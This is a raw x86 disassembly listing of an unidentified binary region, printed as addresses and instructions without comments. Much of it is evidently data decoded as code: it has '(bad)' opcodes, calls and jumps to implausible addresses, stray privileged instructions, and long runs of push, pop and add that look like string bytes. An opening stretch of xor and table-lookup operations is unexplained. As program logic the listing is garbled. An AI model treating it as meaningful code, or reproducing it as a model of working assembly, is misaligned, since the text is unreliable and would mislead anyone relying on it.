  434154:	xor    eax,edi
  434156:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  43415d:	mov    ecx,DWORD PTR [ebp-0x4]
  434160:	mov    ecx,edi
  434162:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434168:	jb     0x434179
  43416a:	add    BYTE PTR [edi-0x3f],dl
  43416d:	add    BYTE PTR [ebp-0x75],cl
  434170:	mov    esi,eax
  434172:	xor    eax,DWORD PTR [eax]
  434174:	mov    al,bh
  434176:	or     eax,0x497284
  43417b:	xor    al,cl
  43417d:	mov    ecx,DWORD PTR [ebp-0x4]
  434180:	mov    ecx,edi
  434182:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434188:	jb     0x434199
  43418a:	add    BYTE PTR [edi],dh
  43418c:	enter  0x8500,0x8b
  434190:	add    ah,bl
  434192:	add    BYTE PTR [eax],al
  434194:	inc    ebp
  434195:	(bad)  
  434196:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  43419d:	mov    esi,DWORD PTR [edx-0x4]
  4341a0:	add    bh,cl
  4341a2:	dec    ebp
  4341a3:	mov    dh,0x8b
  4341a5:	add    esi,DWORD PTR [ebx]
  4341a7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4341ad:	add    BYTE PTR [eax],al
  4341af:	mov    eax,ecx
  4341b1:	loopne 0x434200
  4341b3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4341b9:	dec    ecx
  4341ba:	or     eax,0x8b7232
  4341bf:	in     al,0xc1
  4341c1:	or     DWORD PTR [ebp-0x31],ecx
  4341c4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  4341cb:	xor    dh,BYTE PTR [edx-0x75]
  4341ce:	add    al,dh
  4341d0:	enter  0x4f09,0xcf
  4341d4:	inc    ebp
  4341d5:	mov    WORD PTR [ebx-0x75cdccb7],cs
  4341db:	or     al,BYTE PTR ds:0xe4728b
  4341e1:	or     DWORD PTR [ebp-0x31],ecx
  4341e4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  4341eb:	cmp    dh,BYTE PTR [edx+0xf]
  4341ee:	add    bl,dl
  4341f0:	rol    DWORD PTR [eax],0x4d
  4341f3:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  4341f9:	(bad)  
  4341fa:	or     eax,0x497284
  4341ff:	xor    al,cl
  434201:	mov    ecx,DWORD PTR [ebp-0x20]
  434204:	mov    ecx,DWORD PTR [ecx]
  434206:	xor    ecx,edi
  434208:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  43420f:	xor    cl,al
  434211:	mov    ecx,DWORD PTR [edi]
  434213:	fadd   QWORD PTR [ebp+0x9]
  434216:	call   0xffd03cea
  43421b:	dec    ecx
  43421c:	dec    ebp
  43421d:	xor    bh,BYTE PTR [ebx]
  43421f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  434223:	loopne 0x434221
  434225:	or     edi,eax
  434227:	iret   
  434228:	ret    
  434229:	mov    WORD PTR [ebp+0x4d],es
  43422c:	mov    esi,DWORD PTR [edx]
  43422e:	call   0x8453096d
  434233:	(bad)  
  434234:	cdq    
  434235:	add    BYTE PTR [edx],dh
  434237:	mov    esi,DWORD PTR [ebx]
  434239:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43423f:	test   BYTE PTR [ebx],dh
  434241:	dec    ecx
  434242:	add    esi,DWORD PTR [edx]
  434244:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43424a:	dec    edi
  43424c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d49]
  434253:	xor    al,BYTE PTR [ebx]
  434255:	mov    edi,DWORD PTR [ebx]
  434257:	in     al,0x75
  434259:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43425f:	dec    ecx
  434260:	xor    esi,DWORD PTR [edx]
  434262:	lea    ecx,[edx]
  434264:	or     BYTE PTR [ebx+0x900f072],cl
  43426a:	ja     0x43423b
  43426c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b3],cl
  434273:	cmp    ch,al
  434275:	jne    0x43426a
  434277:	mov    edi,edi
  434279:	fadd   QWORD PTR [ebp+0x0]
  43427c:	mov    eax,edi
  43427e:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb7]
  434285:	mov    edx,DWORD PTR [ebx]
  434287:	in     al,0x45
  434289:	or     DWORD PTR [ebx],esi
  43428b:	iret   
  43428c:	add    ecx,DWORD PTR [eax+edx*2+0x45321849]
  434293:	xor    dl,BYTE PTR [eax-0x75]
  434296:	sbb    al,0xe0
  434298:	dec    DWORD PTR [ecx]
  43429a:	mov    ecx,edi
  43429c:	in     al,dx
  43429d:	mov    eax,es
  43429f:	dec    ecx
  4342a0:	mov    DWORD PTR [edx],esi
  4342a2:	fmul   QWORD PTR [edx]
  4342a4:	jne    0x434231
  4342a6:	(bad)  
  4342a7:	(bad)  
  4342a9:	or     DWORD PTR [ebp-0x31],eax
  4342ac:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b3]
  4342b3:	cmp    bh,bh
  4342b5:	jne    0x4342fc
  4342b7:	lea    ecx,[ebx-0x38372750]
  4342bd:	inc    ebx
  4342bf:	mov    eax,ecx
  4342c1:	mov    eax,0xa00c111
  4342c6:	jne    0x43430d
  4342c8:	mov    esi,DWORD PTR [ebx]
  4342ca:	test   al,0x3
  4342cc:	inc    ebp
  4342cd:	mov    DWORD PTR [eax-0xc],edx
  4342d0:	loop   0x434317
  4342d2:	push   DWORD PTR [ebx]
  4342d4:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4342da:	add    DWORD PTR [eax],eax
  4342dc:	mov    eax,edi
  4342de:	lods   al,BYTE PTR ds:[esi]
  4342df:	dec    ebp
  4342e0:	inc    ebp
  4342e1:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4342e7:	retf   
  4342e8:	mov    edx,ecx
  4342ea:	adc    al,0x84
  4342ec:	(bad)  
  4342ed:	std    
  4342ee:	ret    
  4342ef:	jmp    FWORD PTR [edi-0x2b7474bb]
  4342f5:	hlt    
  4342f6:	rol    edi,0x82
  4342f9:	ret    
  4342fa:	cld    
  4342fb:	enter  0x11ff,0x45
  4342ff:	inc    ebp
  434300:	pop    edi
  434301:	mov    ebx,DWORD PTR [ebx+0x14]
  434304:	ret    0xc7
  434307:	test   BYTE PTR [ebx+0x45325199],cl
  43430d:	jmp    0x43429a
  43430f:	push   0x8
  434311:	call   DWORD PTR [esi]
  434313:	in     al,dx
  434314:	add    BYTE PTR [ebp+0x1],0x50
  434318:	add    bh,ah
  43431a:	add    bh,bh
  43431c:	icebp  
  43431d:	mov    ecx,DWORD PTR [eax]
  43431f:	cld    
  434320:	pop    es
  434321:	dec    ebp
  434322:	shl    DWORD PTR [ebx],0x72
  434325:	add    eax,DWORD PTR [eax]
  434327:	cmp    edx,ecx
  434329:	je     0x43433b
  43432b:	mov    esi,DWORD PTR [ebp-0x4]
  43432e:	inc    edi
  434330:	or     al,0xc3
  434332:	jmp    FWORD PTR [edx-0x18]
  434335:	(bad)  
  434336:	sti    
  434337:	cwde   
  434338:	(bad)  
  434339:	call   0xffa13c44
  43433e:	or     al,0x45
  434340:	push   ebp
  434341:	sub    esp,0x18
  434344:	push   ebx
  434345:	inc    ebp
  434346:	mov    edi,edi
  434348:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43434f:	test   al,0x51
  434351:	inc    ebp
  434352:	push   ecx
  434353:	push   eax
  434354:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43435a:	add    ah,bh
  43435c:	(bad)  
  43435d:	dec    ebp
  43435e:	add    DWORD PTR [ebx],esi
  434360:	inc    ebp
  434361:	add    ecx,DWORD PTR [ebx+0x74943b]
  434367:	push   0xffffff8b
  434369:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43436f:	add    eax,DWORD PTR [ecx]
  434371:	or     BYTE PTR [eax],al
  434373:	call   0xff853b78
  434378:	mov    eax,DWORD PTR [ebp+0x14]
  43437b:	mov    ecx,DWORD PTR [ecx+0x801ac]
  434381:	inc    ebp
  434382:	dec    ecx
  434383:	add    ebp,DWORD PTR [edx+0x14]
  434386:	push   0x8b3045
  43438b:	call   0x33ad9100
  434390:	inc    DWORD PTR [ebx]
  434392:	mov    DWORD PTR [edi],ecx
  434394:	mov    eax,ecx
  434396:	or     BYTE PTR [ebp-0x3d],cl
  434399:	cmp    eax,edi
  43439b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4343a0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4343a6:	adc    al,0xc9
  4343a8:	inc    ebp
  4343a9:	adc    BYTE PTR [eax+0x55],dl
  4343ac:	jne    0x43439a
  4343ae:	call   0xff54433e
  4343b3:	dec    ebp
  4343b4:	inc    ebp
  4343b5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4343bb:	add    BYTE PTR [ebx],bh
  4343bd:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4343c1:	push   ecx
  4343c2:	or     al,0x51
  4343c4:	dec    ebp
  4343c5:	xor    DWORD PTR [ebx],0xf320399
  4343cb:	cmp    eax,DWORD PTR [ebp+0x74]
  4343ce:	mov    edi,edi
  4343d0:	pop    edi
  4343d1:	adc    BYTE PTR [ebx+0x75],bl
  4343d4:	ret    0x50
  4343d7:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4343db:	(bad)  
  4343dc:	clc    
  4343dd:	mov    esp,ebp
  4343df:	pop    ecx
  4343e0:	mov    ecx,0xf80085c2
  4343e5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4343e8:	push   esi
  4343e9:	push   esi
  4343ea:	(bad)  
  4343eb:	lock add eax,DWORD PTR [ebp+0x44]
  4343ef:	mov    edx,DWORD PTR [eax]
  4343f1:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4343f5:	or     BYTE PTR [ecx+0x7],dl
  4343f8:	push   ecx
  4343f9:	ret    
  4343fa:	xor    ebx,DWORD PTR [ecx+0x37232be]
  434400:	add    BYTE PTR [ecx+0x147c8bfe],cl
  434406:	or     al,0x80
  434408:	jge    0x43440b
  43440a:	mov    DWORD PTR [eax],eax
  43440c:	and    al,0x8
  43440e:	cmp    DWORD PTR [ebp+0x10],eax
  434411:	mov    edx,DWORD PTR [esi]
  434413:	xchg   esp,eax
  434414:	dec    esp
  434415:	add    BYTE PTR [eax],dl
  434417:	mov    ecx,edx
  434419:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43441d:	dec    ebp
  43441e:	into   
  43441f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  434425:	mov    edx,DWORD PTR [eax+0x14]
  434428:	das    
  434429:	add    al,0x45
  43442b:	add    BYTE PTR [ebp+0x0],dh
  43442e:	mov    edi,edi
  434430:	and    al,0x50
  434432:	mov    eax,DWORD PTR [eax]
  434434:	and    al,0xd1
  434436:	xor    eax,DWORD PTR [esi]
  434438:	lea    eax,[ebp+0x8]
  43443b:	xor    esi,DWORD PTR [edx+0x3]
  43443e:	add    BYTE PTR [ecx+0x4510fc44],cl
  434444:	cmp    BYTE PTR [ebx+0x75eb0c9c],cl
  43444a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  434454:	cmp    edi,edi
  434456:	pushf  
  434457:	mov    edi,edi
  434459:	or     BYTE PTR [esi+ecx*1],cl
  43445c:	jne    0x434421
  43445e:	call   0xc442a
  434463:	adc    BYTE PTR [ebp+eax*2+0xc],al
  434467:	mov    ebx,DWORD PTR [eax]
  434469:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43446d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  434475:	pop    esi
  434476:	(bad)  
  434477:	leave  
  434478:	call   DWORD PTR [eax]
  43447a:	call   DWORD PTR [ebp+0x24]
  43447d:	in     al,dx
  43447e:	jmp    esp
  434480:	and    al,0x83
  434482:	call   0xff7a4297
  434487:	pushf  
  434488:	inc    esp
  434489:	mov    DWORD PTR [esp],ecx
  43448c:	pop    esi
  43448d:	push   edi
  43448e:	in     eax,0x41
  434490:	ret    0x89
  434493:	and    al,0xe
  434495:	mov    edi,DWORD PTR [eax]
  434497:	and    al,0x75
  434499:	mov    edx,0x7750885
  43449e:	or     dl,bh
  4344a0:	call   FWORD PTR [ecx+0x3243224]
  4344a6:	or     BYTE PTR [ecx-0x74ebdbe8],cl
  4344ac:	dec    DWORD PTR [esp]
  4344af:	jl     0x43443c
  4344b1:	adc    al,0xc
  4344b3:	dec    ebp
  4344b4:	cmp    DWORD PTR [ebp+0x1c],esi
  4344b7:	mov    ecx,DWORD PTR [eax]
  4344b9:	and    al,0x10
  4344bb:	xor    eax,DWORD PTR [ebx+ecx*4+0x3242432]
  4344c2:	test   DWORD PTR [edi],ecx
  4344c4:	jge    0x434490
  4344c6:	push   0x8908ff4c
  4344cb:	jmp    0x4344f1
  4344cd:	adc    BYTE PTR [esp+eax*2-0x75],dh
  4344d1:	dec    esp
  4344d2:	pop    ebp
  4344d3:	ret    0x8999
  4344d6:	push   0x74f89cf8
  4344db:	jmp    0x434551
  4344dd:	mov    edi,0x104fd55f
  4344e2:	add    BYTE PTR [eax],dh
  4344e4:	adc    BYTE PTR ds:[eax],al
  4344e7:	or     edx,DWORD PTR gs:[eax]
  4344ea:	add    BYTE PTR [ecx],ch
  4344ec:	add    eax,0x35270010
  4344f1:	adc    BYTE PTR [eax],al
  4344f3:	std    
  4344f4:	dec    eax
  4344f5:	adc    BYTE PTR [eax],al
  4344f7:	(bad)  
  4344f8:	outs   dx,BYTE PTR ds:[esi]
  4344f9:	adc    BYTE PTR [eax],al
  4344fb:	sahf   
  4344fc:	xor    DWORD PTR [eax],edx
  4344fe:	add    BYTE PTR [esi+0x0],al
  434501:	adc    BYTE PTR [eax],al
  434503:	fs jae 0x434516
  434506:	add    BYTE PTR [ebx-0x20ffefac],bh
  43450c:	inc    esp
  43450d:	inc    ebx
  43450e:	add    bl,ah
  434510:	inc    esp
  434511:	inc    ebx
  434512:	add    bh,ah
  434514:	inc    esp
  434515:	inc    ebx
  434516:	add    bl,ch
  434518:	inc    esp
  434519:	inc    ebx
  43451a:	add    bh,ch
  43451c:	inc    esp
  43451d:	inc    ebx
  43451e:	add    bl,dh
  434520:	inc    esp
  434521:	inc    ebx
  434522:	add    bh,dh
  434524:	inc    esp
  434525:	inc    ebx
  434526:	add    bl,bh
  434528:	inc    esp
  434529:	inc    ebx
  43452a:	add    bh,bh
  43452c:	inc    esp
  43452d:	inc    ebx
  43452e:	add    BYTE PTR [ebx],al
  434530:	inc    ebp
  434531:	inc    ebx
  434532:	add    BYTE PTR [edi],al
  434534:	inc    ebp
  434535:	inc    ebx
  434536:	add    BYTE PTR [eax+ebp*1+0x47180010],dl
  43453d:	adc    BYTE PTR [eax],al
  43453f:	adc    dh,BYTE PTR [ecx+0x10]
  434542:	add    BYTE PTR [edi+0x2c001065],al
  434548:	push   0x5aa20010
  43454d:	adc    BYTE PTR [eax],al
  43454f:	rol    DWORD PTR [eax+edx*1],0x0
  434553:	int    0x6f
  434555:	adc    BYTE PTR [eax],al
  434557:	aaa    
  434558:	inc    ebp
  434559:	inc    ebx
  43455a:	add    BYTE PTR [ebx],bh
  43455c:	inc    ebp
  43455d:	inc    ebx
  43455e:	add    BYTE PTR [edi],bh
  434560:	inc    ebp
  434561:	inc    ebx
  434562:	add    BYTE PTR [ebx+0x45],al
  434565:	inc    ebx
  434566:	add    BYTE PTR [edi+0x45],al
  434569:	inc    ebx
  43456a:	add    BYTE PTR [ebx+0x45],cl
  43456d:	inc    ebx
  43456e:	add    BYTE PTR [edi+0x45],cl
  434571:	inc    ebx
  434572:	add    BYTE PTR [ebx+0x45],dl
  434575:	inc    ebx
  434576:	add    BYTE PTR [ebx+0x54001005],dh
  43457c:	push   ebp
  43457d:	adc    BYTE PTR [eax],al
  43457f:	sbb    bh,BYTE PTR [eax]
  434581:	adc    BYTE PTR [eax],al
  434583:	mov    edx,0x2f001013
  434588:	dec    edx
  434589:	adc    BYTE PTR [eax],al
  43458b:	inc    ecx
  43458c:	or     edx,DWORD PTR [eax]
  43458e:	add    BYTE PTR [ebx+0x19],ch
  434591:	adc    BYTE PTR [eax],al
  434593:	mov    esp,0x7700103e
  434598:	inc    ebp
  434599:	inc    ebx
  43459a:	add    BYTE PTR [ebx+0x45],bh
  43459d:	inc    ebx
  43459e:	add    BYTE PTR [edi+0x45],bh
  4345a1:	inc    ebx
  4345a2:	add    BYTE PTR [ebx-0x78ffbcbb],al
  4345a8:	inc    ebp
  4345a9:	inc    ebx
  4345aa:	add    BYTE PTR [ebx-0x70ffbcbb],cl
  4345b0:	inc    ebp
  4345b1:	inc    ebx
  4345b2:	add    BYTE PTR [ebx-0x50ffbcbb],dl
  4345b8:	push   0x10
  4345ba:	add    al,bl
  4345bc:	imul   edx,DWORD PTR [eax],0x0
  4345bf:	sahf   
  4345c0:	push   ss
  4345c1:	adc    BYTE PTR [eax],al
  4345c3:	jle    0x4345ff
  4345c5:	adc    BYTE PTR [eax],al
  4345c7:	jbe    0x4345de
  4345c9:	adc    BYTE PTR [eax],al
  4345cb:	cmp    DWORD PTR [edi+0x10],edx
  4345ce:	add    BYTE PTR [ebp+0x59001066],bl
  4345d4:	adc    al,0x10
  4345d6:	add    BYTE PTR [edi-0x44ffbcbb],dh
  4345dc:	inc    ebp
  4345dd:	inc    ebx
  4345de:	add    BYTE PTR [edi-0x3cffbcbb],bh
  4345e4:	inc    ebp
  4345e5:	inc    ebx
  4345e6:	add    bh,al
  4345e8:	inc    ebp
  4345e9:	inc    ebx
  4345ea:	add    bl,cl
  4345ec:	inc    ebp
  4345ed:	inc    ebx
  4345ee:	add    bh,cl
  4345f0:	inc    ebp
  4345f1:	inc    ebx
  4345f2:	add    bl,dl
  4345f4:	inc    ebp
  4345f5:	inc    ebx
  4345f6:	add    BYTE PTR [ebx-0x6affef90],bh
  4345fc:	inc    ebp
  4345fd:	adc    BYTE PTR [eax],al
  4345ff:	dec    ebx
  434600:	dec    eax
  434601:	adc    BYTE PTR [eax],al
  434603:	dec    ebx
  434604:	popa   
  434605:	adc    BYTE PTR [eax],al
  434607:	adc    al,BYTE PTR [eax+edx*1]
  43460a:	add    dh,dl
  43460c:	push   ds
  43460d:	adc    BYTE PTR [eax],al
  43460f:	hlt    
  434610:	pop    ds
  434611:	adc    BYTE PTR [eax],al
  434613:	dec    ecx
  434614:	pop    eax
  434615:	adc    BYTE PTR [eax],al
  434617:	test   DWORD PTR [ebp+0x43],0x4345fb00
  43461e:	add    bh,bh
  434620:	inc    ebp
  434621:	inc    ebx
  434622:	add    BYTE PTR [ebx],al
  434624:	inc    esi
  434625:	inc    ebx
  434626:	add    BYTE PTR [edi],al
  434628:	inc    esi
  434629:	inc    ebx
  43462a:	add    BYTE PTR [ebx],cl
  43462c:	inc    esi
  43462d:	inc    ebx
  43462e:	add    BYTE PTR [edi],cl
  434630:	inc    esi
  434631:	inc    ebx
  434632:	add    BYTE PTR [ebx],dl
  434634:	inc    esi
  434635:	inc    ebx
  434636:	add    BYTE PTR [ebp+0x57],cl
  434639:	xor    DWORD PTR [ecx],esi
  43463b:	cmp    BYTE PTR [edi+ebx*2],dh
  43463e:	push   ecx
  43463f:	add    BYTE PTR [edx+0x33],dl
  434642:	push   esi
  434643:	xor    eax,0x3849515f
  434648:	xor    al,0x59
  43464a:	push   edi
  43464b:	add    BYTE PTR [ebx+0x54],al
  43464e:	inc    ebp
  43464f:	pop    edi
  434650:	dec    ebx
  434651:	push   edx
  434652:	push   ebp
  434653:	add    BYTE PTR ss:[esp+eax*2+0x53],cl
  434658:	pop    edi
  434659:	aaa    
  43465a:	xor    al,0x32
  43465c:	xor    BYTE PTR [edi+0x5f],al
  43465f:	inc    ebx
  434660:	pop    edx
  434661:	add    BYTE PTR [edi+0x4e],al
  434664:	cmp    DWORD PTR [edi+0x47],ebx
  434667:	push   ebx
  434668:	cmp    DWORD PTR [edi+0x4e],edx
  43466b:	add    BYTE PTR [ecx+0x44],dl
  43466e:	cmp    BYTE PTR [edi+0x33],bl
  434671:	cmp    BYTE PTR [eax],dh
  434673:	pop    edi
  434674:	inc    ecx
  434675:	dec    edi
  434676:	inc    esi
  434677:	push   eax
  434678:	add    BYTE PTR [edx+0x43],dl
  43467b:	xor    eax,0x41305f30
  434680:	xor    BYTE PTR [esi+0x5f],al
  434683:	inc    ebx
  434684:	xor    dh,BYTE PTR [edx]
  434686:	xor    eax,0x36545200
  43468b:	xor    al,0x5f
  43468d:	dec    esi
  43468e:	xor    esi,DWORD PTR [edx]
  434690:	add    BYTE PTR ss:[eax+0x4b],cl
  434694:	inc    ebx
  434695:	pop    edi
  434696:	ss xor al,0x34
  434699:	pop    edi
  43469a:	inc    ecx
  43469b:	push   esp
  43469c:	dec    edi
  43469d:	add    BYTE PTR [esi+0x52],dl
  4346a0:	push   esi
  4346a1:	pop    edi
  4346a2:	inc    esi
  4346a3:	push   ecx
  4346a4:	push   ebp
  4346a5:	push   edx
  4346a6:	dec    eax
  4346a7:	add    BYTE PTR [esi+0x41],cl
  4346aa:	inc    edx
  4346ab:	pop    edi
  4346ac:	xor    DWORD PTR [ecx],edi
  4346ae:	push   edi
  4346af:	pop    edi
  4346b0:	pop    edx
  4346b1:	xor    eax,0x47003934
  4346b6:	push   edx
  4346b7:	push   ebp
  4346b8:	pop    edi
  4346b9:	xor    al,BYTE PTR [edx+0x30]
  4346bc:	push   ebx
  4346bd:	dec    esi
  4346be:	xor    eax,0x38564300
  4346c3:	xor    al,0x5f
  4346c5:	xor    bl,BYTE PTR [eax+0x36]
  4346c8:	inc    edx
  4346c9:	pop    edi
  4346ca:	pop    ecx
  4346cb:	xor    al,BYTE PTR [ecx+0x0]
  4346ce:	push   edi
  4346cf:	dec    ecx
  4346d0:	push   ebx
  4346d1:	xor    DWORD PTR [eax],edi
  4346d3:	pop    edi
  4346d4:	push   ecx
  4346d5:	xor    BYTE PTR [edx+0x5f],cl
  4346d8:	inc    ecx
  4346d9:	add    BYTE PTR ss:[edx+0x45],al
  4346dd:	push   edi
  4346de:	cmp    DWORD PTR [eax],edi
  4346e0:	pop    edi
  4346e1:	inc    edx
  4346e2:	xor    eax,0x36520057
  4346e7:	aaa    
  4346e8:	xor    BYTE PTR [edi],dh
  4346ea:	pop    edi
  4346eb:	inc    edx
  4346ec:	cmp    DWORD PTR [edi+0x52],eax
  4346ef:	dec    esp
  4346f0:	pop    edi
  4346f1:	dec    ebx
  4346f2:	add    BYTE PTR [esp+edx*2+0x30],al
  4346f6:	pop    edi
  4346f7:	push   ebp
  4346f8:	push   ebx
  4346f9:	aaa    
  4346fa:	dec    ebp
  4346fb:	pop    edi
  4346fc:	xor    ecx,DWORD PTR [edx+0x4e]
  4346ff:	dec    ebx
  434700:	dec    edx
  434701:	add    BYTE PTR [edi+0x47],al
  434704:	xor    eax,0x534e5f32
  434709:	push   esp
  43470a:	pop    edi
  43470b:	push   esp
  43470c:	inc    edx
  43470d:	inc    esi
  43470e:	inc    esp
  43470f:	add    BYTE PTR [ebp+0x4e],al
  434712:	inc    edi
  434713:	cmp    DWORD PTR [edi+0x57],ebx
  434716:	push   eax
  434717:	push   ecx
  434718:	pop    edi
  434719:	dec    edi
  43471a:	inc    ebx
  43471b:	push   edi
  43471c:	pop    edi
  43471d:	inc    edi
  43471e:	add    BYTE PTR [edi+0x45],dl
  434721:	inc    esi
  434722:	pop    edi
  434723:	push   edx
  434724:	inc    edx
  434725:	pop    eax
  434726:	inc    edi
  434727:	ss pop edi
  434729:	push   esi
  43472a:	inc    ebx
  43472b:	dec    esi
  43472c:	inc    esp
  43472d:	add    BYTE PTR [edi+0x4d],cl
  434730:	inc    edi
  434731:	xor    ebx,DWORD PTR [edi+0x34]
  434734:	dec    esi
  434735:	pop    edx
  434736:	cmp    BYTE PTR [edi+0x58],bl
  434739:	cmp    BYTE PTR [eax],al
  43473b:	push   edx
  43473c:	pop    eax
  43473d:	push   ecx
  43473e:	pop    edi
  43473f:	dec    esp
  434740:	push   edx
  434741:	dec    ecx
  434742:	dec    edi
  434743:	inc    esp
  434744:	pop    edi
  434745:	dec    edi
  434746:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43474a:	push   eax
  43474b:	inc    ebp
  43474c:	pop    edi
  43474d:	xor    eax,0x565f3945
  434752:	add    BYTE PTR [edi+0x4e],al
  434755:	push   esi
  434756:	pop    edi
  434757:	inc    edi
  434758:	push   esp
  434759:	dec    eax
  43475a:	xor    dh,BYTE PTR [ecx]
  43475c:	pop    edi
  43475d:	dec    edi
  43475e:	xor    eax,DWORD PTR ss:[eax]
  434761:	inc    esp
  434762:	inc    ebp
  434763:	dec    ecx
  434764:	pop    edi
  434765:	push   edx
  434766:	dec    eax
  434767:	xor    al,0x48
  434769:	dec    ecx
  43476a:	ss pop edi
  43476c:	aaa    
  43476d:	aaa    
  43476e:	dec    ecx
  43476f:	dec    ebp
  434770:	add    BYTE PTR [eax+0x54],cl
  434773:	ss pop edi
  434775:	inc    esi
  434776:	inc    edx
  434777:	xor    dh,BYTE PTR [eax+eax*1]
  43477a:	dec    esi
  43477b:	ss dec edx
  43477d:	pop    edi
  43477e:	dec    ecx
  43477f:	dec    esp
  434780:	inc    edi
  434781:	inc    esp
  434782:	dec    eax
  434783:	xor    BYTE PTR [eax],bh
  434785:	xor    eax,0x34004f00
  43478a:	add    BYTE PTR [eax+eax*1+0x33],cl
  43478e:	add    BYTE PTR [edi],dh
  434790:	add    BYTE PTR [eax],dh
  434792:	add    BYTE PTR [edi+0x0],bl
  434795:	inc    esp
  434796:	add    BYTE PTR [edi+0x0],al
  434799:	dec    ebx
  43479a:	add    BYTE PTR [edx],dh
  43479c:	add    BYTE PTR [ecx+0x0],al
  43479f:	inc    ebx
  4347a0:	add    BYTE PTR [eax],al
  4347a2:	add    BYTE PTR [edi+0x0],cl
  4347a5:	xor    al,BYTE PTR [eax]
  4347a7:	xor    eax,DWORD PTR [eax]
  4347a9:	pop    edi
  4347aa:	add    BYTE PTR [edi+0x0],dl
  4347ad:	xor    al,BYTE PTR [eax]
  4347af:	dec    edi
  4347b0:	add    BYTE PTR [edi+0x0],bl
  4347b3:	pop    edx
  4347b4:	add    BYTE PTR [eax],al
  4347b6:	add    BYTE PTR [eax+0x0],bl
  4347b9:	dec    esp
  4347ba:	add    BYTE PTR [ecx],bh
  4347bc:	add    BYTE PTR [edi+0x0],bl
  4347bf:	dec    ebx
  4347c0:	add    BYTE PTR [ecx+0x0],al
  4347c3:	dec    edx
  4347c4:	add    BYTE PTR [esi+0x0],al
  4347c7:	xor    DWORD PTR [eax],eax
  4347c9:	xor    al,0x0
  4347cb:	pop    edi
  4347cc:	add    BYTE PTR [eax+0x0],bl
  4347cf:	inc    edi
  4347d0:	add    BYTE PTR [edx+0x0],al
  4347d3:	add    BYTE PTR [eax],al
  4347d5:	push   eax
  4347d6:	add    BYTE PTR [ebx],dh
  4347d8:	add    BYTE PTR [esi+0x0],cl
  4347db:	pop    edi
  4347dc:	add    BYTE PTR [eax+0x0],cl
  4347df:	xor    eax,0x5f005300
  4347e4:	add    BYTE PTR [eax+0x0],cl
  4347e7:	add    BYTE PTR [eax],al
  4347e9:	dec    ebp
  4347ea:	add    BYTE PTR [eax],dh
  4347ec:	add    BYTE PTR [edx+0x0],al
  4347ef:	pop    edi
  4347f0:	add    BYTE PTR [edx+0x0],cl
  4347f3:	pop    eax
  4347f4:	add    BYTE PTR [eax+eax*1+0x49],dl
  4347f8:	add    BYTE PTR [eax+eax*1+0x39],cl
  4347fc:	add    BYTE PTR [eax+eax*1+0x0],cl
  434800:	add    BYTE PTR [ecx+0x0],al
  434803:	xor    eax,DWORD PTR [eax]
  434805:	xor    BYTE PTR [eax],al
  434807:	pop    edi
  434808:	add    BYTE PTR [ecx+0x0],al
  43480b:	pop    edx
  43480c:	add    BYTE PTR [ecx+0x0],dl
  43480f:	pop    edx
  434810:	add    BYTE PTR [ecx],bh
  434812:	add    BYTE PTR [esi],dh
  434814:	add    BYTE PTR [edi+0x0],bl
  434817:	dec    eax
  434818:	add    BYTE PTR [eax+eax*1+0x5a],cl
  43481c:	add    BYTE PTR [eax],al
  43481e:	add    BYTE PTR [ecx+0x0],dl
  434821:	push   edi
  434822:	add    BYTE PTR [ecx+0x0],bl
  434825:	pop    edi
  434826:	add    BYTE PTR [esi+0x0],dl
  434829:	xor    al,0x0
  43482b:	inc    esp
  43482c:	add    BYTE PTR [ecx],dh
  43482e:	add    BYTE PTR [eax],bh
  434830:	add    BYTE PTR [edx],dh
  434832:	add    BYTE PTR [edi+0x0],bl
  434835:	cmp    DWORD PTR [eax],eax
  434837:	push   esp
  434838:	add    BYTE PTR [eax+eax*1+0x0],dl
  43483c:	add    BYTE PTR [esi+0x0],dl
  43483f:	dec    edi
  434840:	add    BYTE PTR [edi+0x0],al
  434843:	add    BYTE PTR ss:[edi+0x0],bl
  434847:	dec    edi
  434848:	add    BYTE PTR [edx+0x0],bl
  43484b:	inc    ebp
  43484c:	add    BYTE PTR [eax],dh
  43484e:	add    BYTE PTR [ebp+0x0],al
  434851:	xor    BYTE PTR [eax],al
  434853:	pop    edi
  434854:	add    BYTE PTR [eax],dh
  434856:	add    BYTE PTR ds:0x4f000000,dh
  43485c:	add    BYTE PTR ds:0x5f005700,dh
  434862:	add    BYTE PTR [edi],dh
  434864:	add    BYTE PTR [ebx+0x0],dl
  434867:	push   ebp
  434868:	add    BYTE PTR [edi+0x0],al
  43486b:	xor    al,0x0
  43486d:	pop    edi
  43486e:	add    BYTE PTR [ecx+0x0],dl
  434871:	inc    esp
  434872:	add    BYTE PTR [eax],al
